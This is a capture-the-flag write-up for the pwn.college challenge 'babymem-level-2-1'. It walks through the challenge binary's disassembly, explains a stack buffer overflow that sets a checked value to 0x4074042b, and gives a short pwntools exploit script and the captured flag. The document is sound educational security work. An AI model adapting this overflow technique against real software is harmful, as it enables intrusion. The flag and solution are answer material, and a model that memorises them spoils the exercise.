# level2.1
## Description
Overflow a buffer on the stack to set trickier conditions to obtain the flag!
## Solution
- The challenge file's name is `babymem-level-2-1`. Running `objdump -d -M intel babymem-level-2-1` inside `/challenge` and looking at the `challenge` function:
```
00000000000019b3 <challenge>:
    19b3:       f3 0f 1e fa             endbr64
    19b7:       55                      push   rbp
    19b8:       48 89 e5                mov    rbp,rsp
    19bb:       48 83 ec 60             sub    rsp,0x60
    19bf:       89 7d bc                mov    DWORD PTR [rbp-0x44],edi
    19c2:       48 89 75 b0             mov    QWORD PTR [rbp-0x50],rsi
    19c6:       48 89 55 a8             mov    QWORD PTR [rbp-0x58],rdx
    19ca:       64 48 8b 04 25 28 00    mov    rax,QWORD PTR fs:0x28
    19d1:       00 00 
    19d3:       48 89 45 f8             mov    QWORD PTR [rbp-0x8],rax
    19d7:       31 c0                   xor    eax,eax
    19d9:       48 c7 45 e0 00 00 00    mov    QWORD PTR [rbp-0x20],0x0
    19e0:       00 
    19e1:       48 c7 45 e8 00 00 00    mov    QWORD PTR [rbp-0x18],0x0
    19e8:       00 
    19e9:       48 c7 45 f0 00 00 00    mov    QWORD PTR [rbp-0x10],0x0
    19f0:       00 
    19f1:       48 8d 45 e0             lea    rax,[rbp-0x20]
    19f5:       48 89 45 d0             mov    QWORD PTR [rbp-0x30],rax
    19f9:       48 8d 45 e0             lea    rax,[rbp-0x20]
    19fd:       48 83 c0 14             add    rax,0x14
    1a01:       48 89 45 d8             mov    QWORD PTR [rbp-0x28],rax
    1a05:       48 c7 45 c8 00 00 00    mov    QWORD PTR [rbp-0x38],0x0
    1a0c:       00 
    1a0d:       48 8d 3d f8 06 00 00    lea    rdi,[rip+0x6f8]        # 210c <_IO_stdin_used+0x10c>
    1a14:       b8 00 00 00 00          mov    eax,0x0
    1a19:       e8 42 f7 ff ff          call   1160 <printf@plt>
    1a1e:       48 8d 45 c8             lea    rax,[rbp-0x38]
    1a22:       48 89 c6                mov    rsi,rax
    1a25:       48 8d 3d ef 06 00 00    lea    rdi,[rip+0x6ef]        # 211b <_IO_stdin_used+0x11b>
    1a2c:       b8 00 00 00 00          mov    eax,0x0
    1a31:       e8 7a f7 ff ff          call   11b0 <__isoc99_scanf@plt>
    1a36:       48 8b 45 c8             mov    rax,QWORD PTR [rbp-0x38]
    1a3a:       48 89 c6                mov    rsi,rax
    1a3d:       48 8d 3d dc 06 00 00    lea    rdi,[rip+0x6dc]        # 2120 <_IO_stdin_used+0x120>
    1a44:       b8 00 00 00 00          mov    eax,0x0
    1a49:       e8 12 f7 ff ff          call   1160 <printf@plt>
    1a4e:       48 8b 55 c8             mov    rdx,QWORD PTR [rbp-0x38]
    1a52:       48 8b 45 d0             mov    rax,QWORD PTR [rbp-0x30]
    1a56:       48 89 c6                mov    rsi,rax
    1a59:       bf 00 00 00 00          mov    edi,0x0
    1a5e:       e8 1d f7 ff ff          call   1180 <read@plt>
    1a63:       89 45 c4                mov    DWORD PTR [rbp-0x3c],eax
    1a66:       83 7d c4 00             cmp    DWORD PTR [rbp-0x3c],0x0
    1a6a:       79 2c                   jns    1a98 <challenge+0xe5>
    1a6c:       e8 af f6 ff ff          call   1120 <__errno_location@plt>
    1a71:       8b 00                   mov    eax,DWORD PTR [rax]
    1a73:       89 c7                   mov    edi,eax
    1a75:       e8 56 f7 ff ff          call   11d0 <strerror@plt>
    1a7a:       48 89 c6                mov    rsi,rax
    1a7d:       48 8d 3d c4 06 00 00    lea    rdi,[rip+0x6c4]        # 2148 <_IO_stdin_used+0x148>
    1a84:       b8 00 00 00 00          mov    eax,0x0
    1a89:       e8 d2 f6 ff ff          call   1160 <printf@plt>
    1a8e:       bf 01 00 00 00          mov    edi,0x1
    1a93:       e8 28 f7 ff ff          call   11c0 <exit@plt>
    1a98:       48 8b 45 d8             mov    rax,QWORD PTR [rbp-0x28]
    1a9c:       8b 00                   mov    eax,DWORD PTR [rax]
    1a9e:       3d 2b 04 74 40          cmp    eax,0x4074042b
    1aa3:       75 0a                   jne    1aaf <challenge+0xfc>
    1aa5:       b8 00 00 00 00          mov    eax,0x0
    1aaa:       e8 fd fd ff ff          call   18ac <win>
    1aaf:       48 8d 3d b6 06 00 00    lea    rdi,[rip+0x6b6]        # 216c <_IO_stdin_used+0x16c>
    1ab6:       e8 75 f6 ff ff          call   1130 <puts@plt>
    1abb:       b8 00 00 00 00          mov    eax,0x0
    1ac0:       48 8b 4d f8             mov    rcx,QWORD PTR [rbp-0x8]
    1ac4:       64 48 33 0c 25 28 00    xor    rcx,QWORD PTR fs:0x28
    1acb:       00 00 
    1acd:       74 05                   je     1ad4 <challenge+0x121>
    1acf:       e8 7c f6 ff ff          call   1150 <__stack_chk_fail@plt>
    1ad4:       c9                      leave
    1ad5:       c3                      ret
```
```
    19d9:       48 c7 45 e0 00 00 00    mov    QWORD PTR [rbp-0x20],0x0
    19e0:       00 
    19e1:       48 c7 45 e8 00 00 00    mov    QWORD PTR [rbp-0x18],0x0
    19e8:       00 
    19e9:       48 c7 45 f0 00 00 00    mov    QWORD PTR [rbp-0x10],0x0
    19f0:       00 
```
- These instructions initialise 3 8-byte regions on the stack to 0 (from `rbp-0x20` to `rbp-0x8`).
```
19f1:       48 8d 45 e0             lea    rax,[rbp-0x20]
19f5:       48 89 45 d0             mov    QWORD PTR [rbp-0x30],rax
```
- This basically means `[rbp-0x30] = &([rbp-0x20])`, effectively means that `rbp-0x30` is storing the address of `rbp-0x20` (it's a pointer).
```
19f9:       48 8d 45 e0             lea    rax,[rbp-0x20]
19fd:       48 83 c0 14             add    rax,0x14
1a01:       48 89 45 d8             mov    QWORD PTR [rbp-0x28],rax
```
- This basically means `[rbp-0x28] = &([rbp-0x20] + 0x14)`, effectively means that `rbp-0x28` is storing the address of `rbp-0x20 + 0x14` = `rbp-0x0c`. That's a 20 byte offset. `rbp-0x28` is a pointer to a 20 byte region on the stack. This is the buffer we need to overflow.
```
1a98:       48 8b 45 d8             mov    rax,QWORD PTR [rbp-0x28]
1a9c:       8b 00                   mov    eax,DWORD PTR [rax]
1a9e:       3d 2b 04 74 40          cmp    eax,0x4074042b
1aa3:       75 0a                   jne    1aaf <challenge+0xfc>
1aa5:       b8 00 00 00 00          mov    eax,0x0
1aaa:       e8 fd fd ff ff          call   18ac <win>
```
- `rax = [rbp-0x28]`, which is a pointer to `[rbp-0xc]`.
- `mov eax, DWORD PTR [rax]` reads the 4-byte value stored at this location.
- `cmp eax, 0x4074042b` compares this value with `0x4074042b`.
- If `eax == 0x4074042b`, the `win` function is called.
- So, if we send a 24 byte payload, the last 4 bytes of which are `0x4074042b`, we will overflow the buffer and set the condition to call the `win` function.
- I wrote the following exploit script:
```python
import pwn

padding = b'A' * 20
payload = padding + pwn.p64(0x4074042b)

r = pwn.process('/challenge/babymem-level-2-1')
r.recvuntil('size:')
r.sendline('24')

r.recvuntil('bytes)!')
r.send(payload)
print(r.readall())
```
- Running the script gives the flag: `pwn.college{0UkoXN-hCrp_MYoosWhdqZXQa0h.dhTNzMDL5QTO0czW}`.